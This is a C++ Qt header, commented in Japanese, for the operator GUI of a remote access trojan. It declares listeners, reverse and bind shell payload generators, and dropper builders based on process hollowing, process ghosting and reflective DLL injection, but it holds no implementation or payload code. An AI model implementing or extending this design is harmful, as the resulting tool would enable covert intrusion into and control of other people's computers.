#ifndef MAINWINDOW_H
#define MAINWINDOW_H



// Qtライブラリ
#include <QClipboard>
#include <QIcon>
#include <QPixmap>
#include <QFile>
#include <QFileDialog>
#include <QFileInfo>
#include <QGuiApplication>
#include <QLabel>
#include <QLineEdit>
#include <QMainWindow>
#include <QMenu>
#include <QMenuBar>
#include <QMessageBox>
#include <QSortFilterProxyModel>
#include <QStandardItem>
#include <QStandardItemModel>
#include <QTimer>
#include <QTreeView>
#include <QTreeWidgetItem>
#include <QVBoxLayout>
#include <QProcess>
#include <QInputDialog>
#include <QActionGroup>
#include <QTextEdit>
#include <QDialog>
#include <QFormLayout>
#include <QPushButton>
#include <QThread>
#include <QtGlobal>
#include <QSysInfo>
#include <QRegularExpression>

// WindowsAPI
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <WinSock2.h>
#include <TlHelp32.h>
#include <ws2tcpip.h>
#include <io.h>

// C++ライブラリ
#include <string>
#include <map>
#include <vector>
#include <fstream>
#include <sstream>
#include <thread>
#include <filesystem>
#include <fcntl.h>
#include <random>

#pragma comment(lib, "Ws2_32.lib")

QT_BEGIN_NAMESPACE

QT_END_NAMESPACE





class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);

    // ratのアップロードコマンドを処理
    void StartUploadServer(const std::string& ipAddress, int port);
    void HandleFileUpload(SOCKET clientSocket);


    // ファイルホスティング
    void StartHostingServer(const std::string& ipAddress, int port);
    void HandleFileHosting(SOCKET clientSocket);

    // タブ
    void CreateTab();
    void logMessage(const std::string& message);

    // メニュー
    void CreateMenuBar();
    QMenu* CreateFileMenu();
    QMenu* CreateSettingsMenu();
    QMenu* CreatePayloadGenerationMenu();
    QMenu* CreateListenerMenu();
    QMenu* CreateDropperMenu();


    // ドロッパー生成
    void onReflectiveDllInjectionSelected();
    void onProcessHollowingSelected();
    void onReflectiveDllLoadingSelected();
    void onTransactionHollowingSelected();
    void onProcessGhostingSelected();



    // ディレクトリジャンプ
    void onGeneratedJmp();
    void onHostingJmp();
    void onUploadedJmp();



    // リスナー
    void BindTcpListen();
    void ReverseTcpListen();

    // ファイルホスティングサーバー
    void CreateHostingServer();
    void CreateUploadServer();
    void sendFile(SOCKET clientSocket, const std::string &filePath);

    // ペイロード生成
    void GenerateReverseTcp_Cmd();
    void GenerateBindTcp_Powershell();
    void GenerateReverseTcp_Powershell();
    void GenerateBindTcp_Cmd();
    void GenerateReverseTcp_Vendetta();


    // その他
    bool SaveToFile(const QByteArray& data, QWidget* parent, const QString& defaultPath);
    std::string generateRandomFileName();





private:
    SOCKET HostingServerSocket;
    SOCKET uploadServerSocket;

    QTextEdit *serverLogWindow;

    QTabWidget *tabWidget;

    QTextEdit *logWindow;
    MainWindow* g_mainWindow = nullptr;
};



class InputDialog : public QDialog {
    Q_OBJECT

public:
    InputDialog(const QString &title, const QString &defaultIp = "127.0.0.1", const QString &defaultPort = "5555", QWidget *parent = nullptr)
        : QDialog(parent) {
        setWindowTitle(title);

        ipLineEdit = new QLineEdit(this);
        portLineEdit = new QLineEdit(this);

        // 初期値を設定
        ipLineEdit->setText(defaultIp);
        portLineEdit->setText(defaultPort);

        // プレースホルダー
        ipLineEdit->setPlaceholderText("例: " + defaultIp);
        portLineEdit->setPlaceholderText("例: " + defaultPort);

        // レイアウト
        QFormLayout *formLayout = new QFormLayout;
        formLayout->addRow("IPアドレス:", ipLineEdit);
        formLayout->addRow("ポート番号:", portLineEdit);

        // ボタンの作成と配置
        QPushButton *okButton = new QPushButton("OK", this);
        QPushButton *cancelButton = new QPushButton("Cancel", this);
        connect(okButton, &QPushButton::clicked, this, &InputDialog::onOkClicked);
        connect(cancelButton, &QPushButton::clicked, this, &InputDialog::reject);

        QHBoxLayout *buttonLayout = new QHBoxLayout;
        buttonLayout->addWidget(okButton);
        buttonLayout->addWidget(cancelButton);

        QVBoxLayout *mainLayout = new QVBoxLayout;
        mainLayout->addLayout(formLayout);
        mainLayout->addLayout(buttonLayout);
        setLayout(mainLayout);

        setFixedSize(400, 100);

        if (parent) {
            move(parent->geometry().center() - this->rect().center());
        }
    }

    // ip取得
    QString getIpAddress() const {
        return ipLineEdit->text();
    }

    // ポート取得
    QString getPort() const {
        return portLineEdit->text();
    }

private:
    QLineEdit *ipLineEdit;
    QLineEdit *portLineEdit;

    // 入力チェック

    bool isValidIpAddress(const QString &ipAddress) const {
        QRegularExpression ipRegex("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$");
        return ipRegex.match(ipAddress).hasMatch();
    }

    void onOkClicked() {
        QString ipAddress = ipLineEdit->text();
        QString portString = portLineEdit->text();

        if (!isValidIpAddress(ipAddress)) {
            QMessageBox::warning(this, "入力エラー", "有効なIPアドレスを入力してください。");
            return;
        }

        bool ok;
        int port = portString.toInt(&ok);

        if (!ok || port < 1 || port > 65535) {
            QMessageBox::warning(this, "入力エラー", "有効なポート番号を入力してください (1-65535)。");
            return;
        }

        accept();
    }
};








#endif // MAINWINDOW_H


